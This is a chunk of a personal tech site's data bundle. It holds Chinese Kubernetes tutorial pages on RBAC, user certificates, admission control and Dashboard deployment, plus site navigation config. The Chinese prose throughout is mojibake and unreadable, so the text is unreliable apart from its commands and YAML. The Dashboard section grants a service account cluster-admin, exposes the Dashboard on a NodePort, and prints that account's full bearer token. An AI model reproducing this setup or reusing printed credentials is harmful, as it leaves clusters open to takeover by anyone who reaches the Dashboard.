ä¸ç§å¾å¸¸ç¨çåæ³å°±æ¯ï¼éç¾¤ç®¡çåä¸ºéç¾¤èå´é¢å®ä¹å¥½ä¸ç»è§è²ï¼clusterroleï¼ï¼ç¶åå¨å¤ä¸ªå½åç©ºé´ä¸­éå¤ä½¿ç¨è¿äº clusterroleãè¿æ ·å¯ä»¥å¤§å¹æé«ææç®¡çå·¥ä½æçï¼ä¹ä½¿å¾åä¸ªå½åç©ºé´ä¸çåºç¡æ§ææè§åä¸ä½¿ç¨ä½éªä¿æä¸è´ã\n\n# è½ç¶authorization-clusterroleæ¯ä¸ä¸ªéç¾¤è§è²ï¼ä½æ¯å ä¸ºä½¿ç¨äºrolebinding\n# æä»¥heimaåªè½è¯»ådevå½åç©ºé´ä¸­çèµæº\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå®æï¼åå»ºä¸ä¸ªåªè½ç®¡ç dev ç©ºé´ä¸ pods èµæºçè´¦å·\n1. åå»ºè´¦å·\n\n# 1) åå»ºè¯ä¹¦\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) ç¨apiserverçè¯ä¹¦å»ç­¾ç½²\n# 2-1) ç­¾åç³è¯·ï¼ç³è¯·çç¨æ·æ¯devman,ç»æ¯devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/cn=devman/o=devgroup"     \n# 2-2) ç­¾ç½²è¯ä¹¦\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -ca ca.crt -cakey ca.key -cacreateserial -out devman.crt -days 3650\n\n# 3) è®¾ç½®éç¾¤ãç¨æ·ãä¸ä¸æä¿¡æ¯\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# æ¥çdevä¸podï¼åç°æ²¡ææé\n[root@k8s-master01 pki]# kubectl get pods -n dev\nerror from server (forbidden): pods is forbidden: user "devman" cannot list resource "pods" in api group "" in the namespace "dev"\n\n# åæ¢å°adminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. åå»º role å rolebindingï¼ä¸º devman ç¨æ·ææ\n\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: devman\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: dev-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. åæ¢è´¦æ·ï¼åæ¬¡éªè¯\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# åæ¬¡æ¥ç\n[root@k8s-master01 pki]# kubectl get pods -n dev\nname                                 ready   status             restarts   age\nnginx-deployment-66cb59b984-8wp2k    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     running            0          4d1h\n\n# ä¸ºäºä¸å½±ååé¢çå­¦ä¹ ,ååadminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå¥æ§å¶\n\néè¿äºåé¢çè®¤è¯åææä¹åï¼è¿éè¦ç»è¿åå¥æ§å¶å¤çéè¿ä¹åï¼apiserver æä¼å¤çè¿ä¸ªè¯·æ±ã\n\nåå¥æ§å¶æ¯ä¸ä¸ªå¯éç½®çæ§å¶å¨åè¡¨ï¼å¯ä»¥éè¿å¨ api-server ä¸éè¿å½ä»¤è¡è®¾ç½®éæ©æ§è¡åªäºåå¥æ§å¶å¨ï¼\n\n--admission-control=namespacelifecycle,limitranger,serviceaccount,persistentvolumelabel,\n                      defaultstorageclass,resourcequota,defaulttolerationseconds\n\n\n1\n2\n\n\nåªæå½ææçåå¥æ§å¶å¨é½æ£æ¥éè¿ä¹åï¼apiserver ææ§è¡è¯¥è¯·æ±ï¼å¦åè¿åæç»ã\n\nå½åå¯éç½®ç admission control åå¥æ§å¶å¦ä¸ï¼\n\n * alwaysadmitï¼åè®¸ææè¯·æ±\n * alwaysdenyï¼ç¦æ­¢ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * alwayspullimagesï¼å¨å¯å¨å®¹å¨ä¹åæ»å»ä¸è½½éå\n * denyexeconprivilegedï¼å®ä¼æ¦æªæææ³å¨ privileged container ä¸æ§è¡å½ä»¤çè¯·æ±\n * imagepolicywebhookï¼è¿ä¸ªæä»¶å°åè®¸åç«¯çä¸ä¸ª webhook ç¨åºæ¥å®æ admission controller çåè½ã\n * service accountï¼å®ç° serviceaccount å®ç°äºèªå¨å\n * securitycontextdenyï¼è¿ä¸ªæä»¶å°ä½¿ç¨ securitycontext ç pod ä¸­çå®ä¹å¨é¨å¤±æ\n * resourcequotaï¼ç¨äºèµæºéé¢ç®¡çç®çï¼è§å¯ææè¯·æ±ï¼ç¡®ä¿å¨ namespace ä¸çéé¢ä¸ä¼è¶æ \n * limitrangerï¼ç¨äºèµæºéå¶ç®¡çï¼ä½ç¨äº namespace ä¸ï¼ç¡®ä¿å¯¹ pod è¿è¡èµæºéå¶\n * initialresourcesï¼ä¸ºæªè®¾ç½®èµæºè¯·æ±ä¸éå¶ç podï¼æ ¹æ®å¶éåçåå²èµæºçä½¿ç¨æåµè¿è¡è®¾ç½®\n * namespacelifecycleï¼å¦æå°è¯å¨ä¸ä¸ªä¸å­å¨ç namespace ä¸­åå»ºèµæºå¯¹è±¡ï¼åè¯¥åå»ºè¯·æ±å°è¢«æç»ãå½å é¤ä¸ä¸ª namespace æ¶ï¼ç³»ç»å°ä¼å é¤è¯¥ namespace ä¸­ææå¯¹è±¡ã\n * defaultstorageclassï¼ä¸ºäºå®ç°å±äº«å­å¨çå¨æä¾åºï¼ä¸ºæªæå® storageclass æ pv ç pvc å°è¯å¹éé»è®¤ç storageclassï¼å°½å¯è½åå°ç¨æ·å¨ç³è¯· pvc æ¶æéäºè§£çåç«¯å­å¨ç»è\n * defaulttolerationsecondsï¼è¿ä¸ªæä»¶ä¸ºé£äºæ²¡æè®¾ç½® forgiveness tolerations å¹¶å·æ notready:noexecute å unreachable:noexecute ä¸¤ç§ taints ç pod è®¾ç½®é»è®¤ç âå®¹å¿â æ¶é´ï¼ä¸º 5min\n * podsecuritypolicyï¼è¿ä¸ªæä»¶ç¨äºå¨åå»ºæä¿®æ¹ pod æ¶å³å®æ¯å¦æ ¹æ® pod ç security context åå¯ç¨ç podsecuritypolicy å¯¹ pod çå®å¨ç­ç¥è¿è¡æ§å¶',charsets:{cjk:!0}},{title:"kubernetes(åä¸) DashBoard",frontmatter:{title:"kubernetes(åä¸) DashBoard",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/612",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/612.kubernetes(%E5%8D%81%E4%B8%89)%20DashBoard.html",relativePath:"04.è¿ç»´/60.Kubernetes/612.kubernetes(åä¸) DashBoard.md",key:"v-40ab9df5",path:"/kubernetes/612/",headers:[{level:2,title:"é¨ç½²Dashboard",slug:"é¨ç½²dashboard",normalizedTitle:"é¨ç½² dashboard",charIndex:172},{level:2,title:"ä½¿ç¨DashBoard",slug:"ä½¿ç¨dashboard",normalizedTitle:"ä½¿ç¨ dashboard",charIndex:3508}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"é¨ç½²Dashboard ä½¿ç¨DashBoard",content:"ä¹åå¨ kubernetes ä¸­å®æçæææä½é½æ¯éè¿å½ä»¤è¡å·¥å· kubectl å®æçãå¶å®ï¼ä¸ºäºæä¾æ´ä¸°å¯çç¨æ·ä½éªï¼kubernetes è¿å¼åäºä¸ä¸ªåºäº web çç¨æ·çé¢ï¼Dashboardï¼ãç¨æ·å¯ä»¥ä½¿ç¨ Dashboard é¨ç½²å®¹å¨åçåºç¨ï¼è¿å¯ä»¥çæ§åºç¨çç¶æï¼æ§è¡æéææ¥ä»¥åç®¡ç kubernetes ä¸­åç§èµæºã\n\n\n# é¨ç½² Dashboard\n\n1. ä¸è½½ yamlï¼å¹¶è¿è¡ Dashboard\n\n# ä¸è½½yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# ä¿®æ¹kubernetes-dashboardçServiceç±»å\nkind: Service\napiVersion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: NodePort  # æ°å¢\n  ports:\n    - port: 443\n      targetPort: 8443\n      nodePort: 30009  # æ°å¢\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# é¨ç½²\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# æ¥çnamespaceä¸çkubernetes-dashboardä¸çèµæº\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nNAME                                            READY   STATUS    RESTARTS   AGE\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     Running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     Running   0          111s\n\nNAME                               TYPE       CLUSTER-IP      EXTERNAL-IP  PORT(S)         AGE\nservice/dashboard-metrics-scraper  ClusterIP  10.96.89.218    <none>       8000/TCP        111s\nservice/kubernetes-dashboard       NodePort   10.104.178.171  <none>       443:30009/TCP   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. åå»ºè®¿é®è´¦æ·ï¼è·å token\n\n# åå»ºè´¦å·\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# ææ\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# è·åè´¦å·token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nName:         dashboard-admin-token-xbqhh\nNamespace:    kubernetes-dashboard\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\nType:  kubernetes.io/service-account-token\n\nData\n====\nnamespace:  20 bytes\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. éè¿æµè§å¨è®¿é® Dashboard ç UI\nå¨ç»å½é¡µé¢ä¸è¾å¥ä¸é¢ç token\n\n\n\nåºç°ä¸é¢çé¡µé¢ä»£è¡¨æå\n\n\n\n\n# ä½¿ç¨ DashBoard\n\næ¥ç\néæ©æå®çå½åç©ºé´ dev ï¼ç¶åç¹å» Deployments ï¼æ¥ç dev ç©ºé´ä¸çææ deployment\n\n\n\næ©ç¼©å®¹\nå¨ Deployment ä¸ç¹å» è§æ¨¡ ï¼ç¶åæå® ç®æ å¯æ¬æ°é ï¼ç¹å»ç¡®å®\n\n\n\nç¼è¾\nå¨ Deployment ä¸ç¹å» ç¼è¾ ï¼ç¶åä¿®æ¹ yamlæä»¶ ï¼ç¹å»ç¡®å®\n\n\n\næ¥ç Pod\nç¹å» Pods , æ¥ç pods åè¡¨\n\n\n\næä½ Pod\néä¸­æä¸ª Podï¼å¯ä»¥å¯¹å¶æ§è¡æ¥å¿ï¼logsï¼ãè¿å¥æ§è¡ï¼execï¼ãç¼è¾ãå é¤æä½\n\n",normalizedContent:"ä¹åå¨ kubernetes ä¸­å®æçæææä½é½æ¯éè¿å½ä»¤è¡å·¥å· kubectl å®æçãå¶å®ï¼ä¸ºäºæä¾æ´ä¸°å¯çç¨æ·ä½éªï¼kubernetes è¿å¼åäºä¸ä¸ªåºäº web çç¨æ·çé¢ï¼dashboardï¼ãç¨æ·å¯ä»¥ä½¿ç¨ dashboard é¨ç½²å®¹å¨åçåºç¨ï¼è¿å¯ä»¥çæ§åºç¨çç¶æï¼æ§è¡æéææ¥ä»¥åç®¡ç kubernetes ä¸­åç§èµæºã\n\n\n# é¨ç½² dashboard\n\n1. ä¸è½½ yamlï¼å¹¶è¿è¡ dashboard\n\n# ä¸è½½yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# ä¿®æ¹kubernetes-dashboardçserviceç±»å\nkind: service\napiversion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: nodeport  # æ°å¢\n  ports:\n    - port: 443\n      targetport: 8443\n      nodeport: 30009  # æ°å¢\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# é¨ç½²\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# æ¥çnamespaceä¸çkubernetes-dashboardä¸çèµæº\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nname                                            ready   status    restarts   age\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     running   0          111s\n\nname                               type       cluster-ip      external-ip  port(s)         age\nservice/dashboard-metrics-scraper  clusterip  10.96.89.218    <none>       8000/tcp        111s\nservice/kubernetes-dashboard       nodeport   10.104.178.171  <none>       443:30009/tcp   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. åå»ºè®¿é®è´¦æ·ï¼è·å token\n\n# åå»ºè´¦å·\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# ææ\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# è·åè´¦å·token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nname:         dashboard-admin-token-xbqhh\nnamespace:    kubernetes-dashboard\nlabels:       <none>\nannotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\ntype:  kubernetes.io/service-account-token\n\ndata\n====\nnamespace:  20 bytes\ntoken:      eyjhbgcioijsuzi1niisimtpzci6imjrykf4bw5xcdhwcmngugjtek5nodfusxl1awptmmu2m3o4lty5a2fks2cifq.eyjpc3mioijrdwjlcm5ldgvzl3nlcnzpy2vhy2nvdw50iiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9uyw1lc3bhy2uioijrdwjlcm5ldgvzlwrhc2hib2fyzcisimt1ymvybmv0zxmuaw8vc2vydmljzwfjy291bnqvc2vjcmv0lm5hbwuioijkyxnoym9hcmqtywrtaw4tdg9rzw4tegjxaggilcjrdwjlcm5ldgvzlmlvl3nlcnzpy2vhy2nvdw50l3nlcnzpy2utywnjb3vudc5uyw1lijoizgfzagjvyxjklwfkbwluiiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9zzxj2awnllwfjy291bnqudwlkijoiotvkodrkodatymu3ys00zdewlweyztatnjhmotaymjjkmdm5iiwic3viijoic3lzdgvtonnlcnzpy2vhy2nvdw50omt1ymvybmv0zxmtzgfzagjvyxjkomrhc2hib2fyzc1hzg1pbij9.nal7e8zfwwddopxkqzjztb46sk9e8iujynui9vnbay3jts7t1g1msjsbnbxzqsygag--cv0wyxjndzjy_uwcwagprqrt_gunxmok9aunzurqm55gr2rxiztjswvp2ebatsdghrmuubqvtfovdjb4x3nxcyln2opaamqg3rnu2rr-a8zcriux_eca12wip_qiup3sf-tzpdlpsyrfegtjzl6ynsgyavkc9id-cxzrb307qdcfxpfchr_2rt5fvfxargg_c0e3efhaayqo7citxsnioixpofnar8aurmopjyodqipqbwuehb7fhlu1dcduhniixvc_uicz-mkyewbdlw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. éè¿æµè§å¨è®¿é® dashboard ç ui\nå¨ç»å½é¡µé¢ä¸è¾å¥ä¸é¢ç token\n\n\n\nåºç°ä¸é¢çé¡µé¢ä»£è¡¨æå\n\n\n\n\n# ä½¿ç¨ dashboard\n\næ¥ç\néæ©æå®çå½åç©ºé´ dev ï¼ç¶åç¹å» deployments ï¼æ¥ç dev ç©ºé´ä¸çææ deployment\n\n\n\næ©ç¼©å®¹\nå¨ deployment ä¸ç¹å» è§æ¨¡ ï¼ç¶åæå® ç®æ å¯æ¬æ°é ï¼ç¹å»ç¡®å®\n\n\n\nç¼è¾\nå¨ deployment ä¸ç¹å» ç¼è¾ ï¼ç¶åä¿®æ¹ yamlæä»¶ ï¼ç¹å»ç¡®å®\n\n\n\næ¥ç pod\nç¹å» pods , æ¥ç pods åè¡¨\n\n\n\næä½ pod\néä¸­æä¸ª podï¼å¯ä»¥å¯¹å¶æ§è¡æ¥å¿ï¼logsï¼ãè¿å¥æ§è¡ï¼execï¼ãç¼è¾ãå é¤æä½\n\n",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:"/assets/img/logo2.png",heroText:"äººæ°ä¸å²",tagline:"æ¾ä¸ä¸ªäººç´ è´¨ï¼äº«åç¼ºå¾·äººçï¼æç»ç²¾ç¥åèï¼æäºç´æ¥åç¯",bannerBg:"none",features:[{title:"ç«å",details:"ä¸ä¸ªææå ç¾åï¼ä½ ç©ä»ä¹å½åï¼ï¼ï¼"},{title:"åé®å¤©",details:"å¬éä¸å¨äººå¿ï¼æ¯éå¨ä¹å®å"},{title:"è£å¤©å®",details:"æå½ç±æä¸ç±å¤©"}],postList:"none",simplePostListLength:0,hideRightBar:!0},regularPath:"/",relativePath:"index.md",key:"v-59de6d20",path:"/",headers:[{level:2,title:"æ¶æ",slug:"æ¶æ",normalizedTitle:"æ¶æ",charIndex:2},{level:2,title:"é¼å±",slug:"é¼å±",normalizedTitle:"é¼å±",charIndex:9}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"æ¶æ é¼å±",content:"# æ¶æ\n\n\n# é¼å±\n\nä¸çæ¯ä½ ä»¬çï¼ä¹æ¯æä»¬çï¼ä½æ¯å½æ ¹ç»åºæ¯ä½ ä»¬çãä½ ä»¬éå¹´äººææ°è¬åï¼æ­£å¨å´æºæ¶æï¼å¥½åæ©æ¨å«ä¹ç¹éçå¤ªé³ãå¸æå¯æå¨ä½ ä»¬èº«ä¸ãââ æ¯æ³½ä¸",normalizedContent:"# æ¶æ\n\n\n# é¼å±\n\nä¸çæ¯ä½ ä»¬çï¼ä¹æ¯æä»¬çï¼ä½æ¯å½æ ¹ç»åºæ¯ä½ ä»¬çãä½ ä»¬éå¹´äººææ°è¬åï¼æ­£å¨å´æºæ¶æï¼å¥½åæ©æ¨å«ä¹ç¹éçå¤ªé³ãå¸æå¯æå¨ä½ ä»¬èº«ä¸ãââ æ¯æ³½ä¸",charsets:{cjk:!0}}],themeConfig:{nav:[{text:"é¦é¡µ",link:"/"},{text:"è¯­è¨",items:[{text:"JAVA",link:"/language/java/base/1/"},{text:"ä»é¢",link:"/language/cj/1/"},{text:"è®¾è®¡æ¨¡å¼",link:"/language/mode/1/"}]},{text:"æ¡æ¶",items:[{text:"Spring",link:"/spring/spring/200/"},{text:"Mybatis",link:"/mybatis/mybatis/300/"},{text:"Maven",link:"/maven/2300/"}]},{text:"ä¸­é´ä»¶",items:[{text:"Kafka",link:"/kafka/1400/"},{text:"RabbitMQ",link:"/rabbitmq/1500/"},{text:"Redis",link:"/redis/1600/"},{text:"Nginx",link:"/nginx/1/"},{text:"Elasticsearch",link:"/es/1800/"}]},{text:"å¤§æ°æ®",items:[{text:"Hadoop",link:"/hadoop/700/"},{text:"ClickHouse",link:"/clickhouse/800/"},{text:"Hbase",link:"/hbase/900/"},{text:"Hive",link:"/hive/1000/"},{text:"Flume",link:"/flume/1100/"},{text:"Flink",link:"/flink/1200/"},{text:"MySQL",link:"/mysql/1300/"},{text:"MongoDB",link:"/mongodb/1800/"}]},{text:"åç«¯",items:[{text:"VUE3",link:"/vue3/1900/"},{text:"å¾®ä¿¡å°ç¨åº",link:"/wx/2000/"}]},{text:"è¿ç»´",items:[{text:"linux",link:"/linux/2300/"},{text:"Docker",link:"/docker/400/"},{text:"Jenkins",link:"/jenkins/500/"},{text:"Kubernetes",link:"/kubernetes/600/"}]}],sidebarDepth:2,logo:"/assets/img/logo1.png",repo:"landashu?tab=repositories",searchMaxSuggestions:10,lastUpdated:"ä¸æ¬¡æ´æ°",docsDir:"docs",editLinks:!1,editLinkText:"ç¼è¾",pageStyle:"line",defaultMode:"auto",category:!1,tag:!1,archive:!1,rightMenuBar:!0,sidebarOpen:!0,sidebar:{"/00.è¯­è¨/":[{title:"JAVA",collapsable:!1,children:[{title:"åºç¡",collapsable:!1,children:[["01.JAVA/01.åºç¡/1.JAVA é å çº¿ç¨.md","JAVA é å çº¿ç¨","/language/java/base/1/"],["01.JAVA/01.åºç¡/2.JAVA NIO API.md","JAVA NIO API","/language/java/base/2/"]]},{title:"JVM",collapsable:!1,children:[["01.JAVA/02.JVM/1.JVMæ¨¡åä»ç».md","JVM æ¨¡åä»ç»","/language/java/jvm/1/"]]},{title:"çæ¬",collapsable:!1,children:[["01.JAVA/03.çæ¬/1.JAVA8 æ°ç¹æ§æ»ç».md","JAVA8 æ°ç¹æ§æ»ç»","/language/java/version/1/"],["01.JAVA/03.çæ¬/2.JAVA9 æ°ç¹æ§æ»ç».md","JAVA9 æ°ç¹æ§æ»ç»","/language/java/version/2/"],["01.JAVA/03.çæ¬/3.JAVA 10-17 æ°ç¹æ§æ»ç».md","JAVA 10/11/12/13/14/15/16/17 æ°ç¹æ§æ»ç»","/language/java/version/3/"]]},{title:"å¶ä»",collapsable:!1,children:[["01.JAVA/04.å¶ä»/1.æåexeç¨åº.md","jar æåæ.exeå¯æ§è¡æä»¶","/language/java/other/1/"],["01.JAVA/04.å¶ä»/2.javaä»£ç æ··æ·ä¹ProGuard.md","javaä»£ç æ··æ·ä¹ ProGuard","/language/java/other/2/"],["01.JAVA/04.å¶ä»/3.JAVA æ§è½çæ§ï¼jvisualvmï¼åæµè¯ï¼JMeterï¼.md","JAVA æ§è½çæ§ï¼jvisualvmï¼åæµè¯ï¼JMeterï¼","/language/java/other/3/"],["01.JAVA/04.å¶ä»/4.Alibaba Arthas.md","Alibaba Arthas","/language/java/other/4/"],["01.JAVA/04.å¶ä»/5.jarå¯å¨èæ¬.md","jarå¯å¨èæ¬","/language/java/other/5/"]]}]},{title:"ä»é¢",collapsable:!1,children:[{title:"åºç¡",collapsable:!1,children:[["02.ä»é¢/01.åºç¡/1.ä»é¢.md","JVM æ¨¡åä»ç»","/language/cj/1/"]]}]},{title:"è®¾è®¡æ¨¡å¼",collapsable:!1,children:[["03.è®¾è®¡æ¨¡å¼/1.è®¾è®¡æ¨¡å¼.md","ä»£çæ¨¡å¼","/language/mode/1/"]]}],catalogue:{},"/01.æ¡æ¶/":[{title:"Spring",collapsable:!1,children:[{title:"spring",collapsable:!1,children:[["01.Spring/01.spring/200.æ ¸å¿åå®¹æè§£ IOC.md","æ ¸å¿åå®¹æè§£ IOC","/spring/spring/200/"],["01.Spring/01.spring/201.æ ¸å¿åå®¹æè§£ AOP.md","æ ¸å¿åå®¹æè§£ AOP","/spring/spring/201/"],["01.Spring/01.spring/202.æ ¸å¿åå®¹æè§£ äºä»¶éç¥.md","æ ¸å¿åå®¹æè§£ äºä»¶éç¥","/spring/spring/202/"],["01.Spring/01.spring/203.æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­.md","æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­","/spring/spring/203/"],["01.Spring/01.spring/204.æ ¸å¿åå®¹æè§£ FactoryBean.md","æ ¸å¿åå®¹æè§£ FactoryBean","/spring/spring/204/"],["01.Spring/01.spring/205.æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±».md","æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»","/spring/spring/205/"]]},{title:"spring mv",collapsable:!1,children:[["01.Spring/02.spring mv/200.Spring MVC ä¹å·¥ä½åç.md","Spring MVC ä¹åºæ¬å·¥ä½åç","/spring/spring-mvc/200/"]]},{title:"spring boot",collapsable:!1,children:[["01.Spring/03.spring boot/200.SpringBoot ä¹ FilterãInterceptorãAspect.md","SpringBoot ä¹ FilterãInterceptorãAspect","/spring/spring-boot/200/"],["01.Spring/03.spring boot/201.SpringBoot ä¹ Starter.md","SpringBoot ä¹ Starter","/spring/spring-boot/201/"],["01.Spring/03.spring boot/202.SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®.md","SpringBoot ä¹ Stomp ä½¿ç¨å vue ç¸éç½®","/spring/spring-boot/202/"],["01.Spring/03.spring boot/203.SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº.md","SpringBoot MyBatisPlus å®ç°å¤æ°æ®æº","/spring/spring-boot/203/"],["01.Spring/03.spring boot/204.SpringBoot MyBatis å¨æå»ºè¡¨.md","SpringBoot MyBatis 